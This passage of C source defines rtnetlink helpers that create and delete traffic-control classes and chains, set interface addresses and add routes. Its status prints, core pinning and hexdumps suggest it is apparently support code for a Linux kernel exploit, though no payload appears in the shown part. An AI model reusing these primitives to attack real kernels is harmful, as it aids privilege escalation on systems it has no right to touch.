    memset(nlh, 0, ADD_CLASS);
    nlh->nlmsg_len = ADD_CLASS;
    nlh->nlmsg_type = RTM_GETTCLASS; // tc_ctl_tclass
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST | NLM_F_REPLACE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_INET;
    tcm->tcm_parent = 0xFFFFFFFF; // clid = TC_H_ROOT = 0xFFFFFFFF , TC_H_INGRESS    (0xFFFFFFF1)
    tcm->tcm_handle = 0x10000;  

    /* prepare asociated attribute */
    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));


    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_addclass(): add class
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
 * @handle: idenfity class 
*/
void rt_addclass(int sock, unsigned int link_id, unsigned int handle)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh = NULL;
    struct nlattr *tca;
    struct tcmsg *tcm;
    int prio, proto;
    char qdisc_ops[] = "dsmark\0"; // pfifo

    assign_to_core(DEF_CORE);

    printf("[+] rt_addclass with link_id: 0x%x\n", link_id);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(ADD_CLASS);
    if (!nlh) {
        errout("rt_addclass malloc");
    }

    memset(nlh, 0, ADD_CLASS);
    nlh->nlmsg_len = ADD_CLASS;
    nlh->nlmsg_type = RTM_NEWTCLASS; // tc_ctl_tclass
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_INET;
    tcm->tcm_parent = 0x10000; // clid = TC_H_ROOT = 0xFFFFFFFF , TC_H_INGRESS    (0xFFFFFFF1)
    tcm->tcm_handle = handle;    // 0xffff0000 0x10000 1:0 qdisc handle  --> need if (tcm->tcm_handle)  -> fail

    /* prepare asociated attribute */
    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));
    tca = set_nested_attr(tca, TCA_OPTIONS, sizeof(struct nlattr)*2 + 2);
    tca = set_u8_attr(tca, TCA_DSMARK_VALUE, 0x1);
    tca = set_u8_attr(tca, TCA_DSMARK_MASK, 0xff);



    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_delclass(): delte existing class
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
 * @handle: idenfity class 
*/
void rt_delclass(int sock, unsigned int link_id, unsigned int handle)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh = NULL;
    struct nlattr *tca;
    struct tcmsg *tcm;

    printf("[+] rt_delclass with link_id: 0x%x\n", link_id);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(ADD_CLASS);
    if (!nlh) {
        errout("rt_delclass malloc");
    }

    memset(nlh, 0, ADD_CLASS);
    nlh->nlmsg_len = ADD_CLASS;
    nlh->nlmsg_type = RTM_DELTCLASS; // tc_ctl_tclass
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; // TCM_IFINDEX_MAGIC_BLOCK
    tcm->tcm_family = AF_INET;
    tcm->tcm_parent = 0x10000; // clid = TC_H_ROOT = 0xFFFFFFFF , TC_H_INGRESS    (0xFFFFFFF1)
    tcm->tcm_handle = handle;    // 0xffff0000 0x10000 1:0 qdisc handle  --> need if (tcm->tcm_handle)  -> fail

    /* prepare asociated attribute */
    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));



    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}

/**
 * inet_dumpaddr(): get the information of the link network
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
*/
void inet_dumpaddr(int sock, unsigned int link_id)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tb;
    struct ifaddrmsg *ifm;
    int prio, proto, ret, err;
    char buf_recv[1024] = {0};
    struct rtattr *attr;
    struct ifaddrmsg *addr;
    unsigned char bytes[4] = {0};

    printf("[+] inet_dumpaddr of link_id: %d\n", link_id);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(ADDR_SIZE);
    if (!nlh)
        errout("inet_dumpaddr malloc");

    memset(nlh, 0, ADDR_SIZE);
    nlh->nlmsg_len = ADDR_SIZE;
    nlh->nlmsg_type = RTM_GETADDR; // inet_dump_ifaddr
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_DUMP | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    ifm = NLMSG_DATA(nlh);

    ifm->ifa_index = link_id; // interface
    ifm->ifa_family = AF_INET;

    /* prepare asociated attribute */
    tb = (void *)ifm + NLMSG_ALIGN(sizeof(struct tcmsg));

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    err = sendmsg(sock, &msg, 0);
    if (!err) {
        errout("sendmsg");
    }

    /* receive message */
    iov[0].iov_base = (void *)buf_recv;
    iov[0].iov_len = BUF_SIZE;
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    ret = recvmsg(sock, &msg, 0);
    if (ret == -1)
        errout("recvmsg");

    // hexdump(buf_recv, 0x200);
    // ifm = NLMSG_DATA(buf_recv);
    int ip = *(int *)(buf_recv+0x1c);
    bytes[0] = ip & 0xFF;
    bytes[1] = (ip >> 8) & 0xFF;
    bytes[2] = (ip >> 16) & 0xFF;
    bytes[3] = (ip >> 24) & 0xFF;
    printf("IP Address : %d.%d.%d.%d\n", bytes[0], bytes[1], bytes[2], bytes[3]);

    /* Free used structures */
    free(nlh);
}

/**
 * inet_newaddr(): get the information of the link network
 * @sock: socket bound to the route table netlink
 * @link_id: identify link
 * @ip: new ip address in heximal
*/
void inet_newaddr(int sock, unsigned int link_id, unsigned int ip)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tb;
    struct ifaddrmsg *ifm;
    int prio, proto, err;

    printf("[+] inet_newaddr of link_id: %d\n", link_id);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(ADDR_SIZE);
    if (!nlh)
        errout("inet_newaddr malloc");

    memset(nlh, 0, ADDR_SIZE);
    nlh->nlmsg_len = ADDR_SIZE;
    nlh->nlmsg_type = RTM_NEWADDR; // inet_rtm_newaddr
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST | NLM_F_REPLACE; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    ifm = NLMSG_DATA(nlh);

    ifm->ifa_family = AF_INET;
    ifm->ifa_prefixlen = 24;
    // ifm->ifa_flags = IFA_F_PERMANENT;
    ifm->ifa_scope = RT_SCOPE_UNIVERSE;
    ifm->ifa_index = link_id; // TCM_IFINDEX_MAGIC_BLOCK

    /* prepare asociated attribute */
    tb = (void *)ifm + NLMSG_ALIGN(sizeof(struct ifaddrmsg));
    // tb = set_u32_attr(tb, IFA_ADDRESS, ip);   // 
    tb = set_u32_attr(tb, IFA_BROADCAST, 0x6b1019ff); // 
    tb = set_u32_attr(tb, IFA_LOCAL, ip); // '127.0.0.1'
    // tb = set_u8_attr(tb, IFA_PROTO, 1);

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    err = sendmsg(sock, &msg, 0);
    if (!err) {
        errout("sendmsg");
    }

    /* Free used structures */
    free(nlh);
}

/**
 * rt_addroute(): add routing table 
 * @sock: socket bound to the route table netlink
*/
void rt_addroute(int sock)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *attr;
    struct rtmsg *rtm;
    struct rtvia *via;
    uint32_t via_addr = ADDR_SERVER;
    unsigned char addr[] = {};
    int prio, proto, err;

    printf("[+] rt_addroute\n");

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(ADD_ROUTE);
    if (!nlh)
        errout("rt_addroute malloc");

    memset(nlh, 0, ADD_ROUTE);
    nlh->nlmsg_len = ADD_ROUTE;
    nlh->nlmsg_type = RTM_NEWROUTE; // inet_rtm_newroute
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REPLACE | NLM_F_REQUEST;// not sure with replace flag? // NLM_F_EXCL
    nlh->nlmsg_seq = 0;

    /* route table data */
    rtm = NLMSG_DATA(nlh);
    rtm->rtm_family = AF_INET;
    // rtm->rtm_table = RT_TABLE_DEFAULT; // RT_TABLE_MAIN RT_TABLE_LOCAL
    rtm->rtm_type = RTN_UNICAST;
    rtm->rtm_scope = RT_SCOPE_UNIVERSE;
    rtm->rtm_protocol = RTPROT_DHCP; // RTPROT_BOOT:3

    /* prepare asociated attribute */
    attr = (void *)rtm + NLMSG_ALIGN(sizeof(struct rtmsg));
    via = (struct rtvia*)malloc(sizeof(struct rtvia) + 4);
    // via = (struct rtvia *)attr;
    via->rtvia_family = AF_INET;
    via->rtvia_addr[0] = 0x6b; // 0x6b10190c
    via->rtvia_addr[1] = 0x10;
    via->rtvia_addr[2] = 0x19;
    via->rtvia_addr[3] = 0x02;
    attr = set_binary_attr(attr, RTA_VIA, (uint8_t *)via, 6);
    attr = (void *)via + NLMSG_ALIGN(6);
    attr = set_u32_attr(attr, RTA_GATEWAY, ADDR_GW);
    attr = set_u32_attr(attr, RTA_DST, ADDR_SERVER);



    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    err = sendmsg(sock, &msg, 0);
    if (!err) {
        errout("sendmsg");
    }

    /* Free used structures */
    free(nlh);
}

/**
 * rt_cloneroute(): nothing, not developing
 * @sock: socket bound to the route table netlink
*/
void rt_cloneroute(int sock, unsigned int link_id)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh;
    struct nlattr *tb;
    struct rtmsg *rtm;
    int prio, proto, err;
    char buf_recv[1024] = {0};

    printf("[+] rt_cloneroute of link_id: %d\n", link_id);

    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(ADD_ROUTE);
    if (!nlh)
        errout("rt_cloneroute malloc");

    memset(nlh, 0, ADD_ROUTE);
    nlh->nlmsg_len = ADD_ROUTE;
    nlh->nlmsg_type = RTM_GETROUTE; // inet_dump_fib
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags =  NLM_F_REQUEST;
    nlh->nlmsg_seq = 0;

    /* route table data */
    rtm = NLMSG_DATA(nlh);
    rtm->rtm_flags = RTM_F_CLONED;
    rtm->rtm_family = AF_INET;


    /* prepare asociated attribute */
    tb = (void *)rtm + NLMSG_ALIGN(sizeof(struct rtmsg));
    tb = set_u32_attr(tb, RTA_OIF, link_id);
    tb = set_u32_attr(tb, RTA_TABLE, RT_TABLE_MAIN);

    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    err = sendmsg(sock, &msg, 0);
    if (!err) {
        errout("sendmsg");
    }

    /* receive message */
    iov[0].iov_base = (void *)buf_recv;
    iov[0].iov_len = BUF_SIZE;
    memset(&msg, 0, sizeof(msg));
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    err = recvmsg(sock, &msg, 0);
    if (err == -1)
        errout("recvmsg");

    hexdump(buf_recv, 0x200);

    /* Free used structures */
    free(nlh);
}

/**
 * rt_delchain(): delete the chain in queueing discipline 
 * @sock: socket bound to the route table netlink
 * @link_id: idendify link 
 */
void rt_delchain(int sock, unsigned int link_id)
{
    struct msghdr msg;
    struct sockaddr_nl dest_snl;
    struct iovec iov[3];
    struct nlmsghdr *nlh = NULL;
    struct nlattr *tca;
    struct tcmsg *tcm;

    assign_to_core(DEF_CORE);

    printf("[+] rt_delchain with link_id: 0x%x\n", link_id);
    /* Destination preparation */
    memset(&dest_snl, 0, sizeof(struct sockaddr_nl));
    dest_snl.nl_family = AF_NETLINK;
    memset(&msg, 0, sizeof(msg));

    /* route table netlink table message preparation */
    nlh = (struct nlmsghdr *)malloc(ADD_CLASS);
    if (!nlh) {
        errout("rt_delchain malloc");
    }

    memset(nlh, 0, ADD_CLASS);
    nlh->nlmsg_len = ADD_CLASS;
    nlh->nlmsg_type = RTM_DELCHAIN; // tc_ctl_chain
    nlh->nlmsg_pid = getpid();
    nlh->nlmsg_flags = NLM_F_CREATE | NLM_F_REQUEST; // need NLM_F_REQUEST flag
    nlh->nlmsg_seq = 0;

    /* route table data */
    // Attribute failed policy validation
    tcm = NLMSG_DATA(nlh);
    tcm->tcm_ifindex = link_id; 
    tcm->tcm_family = AF_INET;
    tcm->tcm_parent = 0x10000; 

    /* prepare asociated attribute */
    tca = (void *)tcm + NLMSG_ALIGN(sizeof(struct tcmsg));



    /* IOV preparation */
    memset(iov, 0, sizeof(struct iovec) * 3);
    iov[0].iov_base = (void *)nlh;
    iov[0].iov_len = nlh->nlmsg_len;

    /* Message header preparation */
    msg.msg_name = (void *)&dest_snl;
    msg.msg_namelen = sizeof(struct sockaddr_nl);
    msg.msg_iov = iov;
    msg.msg_iovlen = 1;

    sendmsg(sock, &msg, 0);

    /* Free used structures */
    free(nlh);
}